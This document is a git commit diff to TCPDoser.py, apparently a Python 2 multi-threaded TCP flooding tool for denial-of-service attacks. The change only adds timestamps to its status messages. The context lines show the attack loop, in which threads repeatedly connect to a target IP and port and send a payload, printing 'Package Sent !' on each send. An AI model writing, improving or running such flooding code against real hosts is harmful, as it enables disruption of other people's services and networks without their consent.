9669abca027b91b9d8051715721a9106c18395fd
bossy0 <36817786+bossy0@users.noreply.github.com>
2018-10-01 11:45:44 +0300

    Update TCPDoser.py

--- TCPDoser.py
+++ TCPDoser.py
@@ -24,10 +24,10 @@ def run():
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((str(ip),int(port))) 
 			s.send(bytes)
-			print "\033[92m [+] Package Sent ! \033[0m"
+			print "\033[94m",time.ctime(time.time()),"\033[0m \033[92m [+] Package Sent ! \033[0m"
 		except:
 			s.close()
-			print "\033[91m [!] Error , Socket Closed \033[0m"
+			print "\033[94m",time.ctime(time.time()),"\033[0m \033[91m [!] Error , Socket Closed \033[0m"
 			
 for i in range(thread_num):
     th = threading.Thread(target = run)
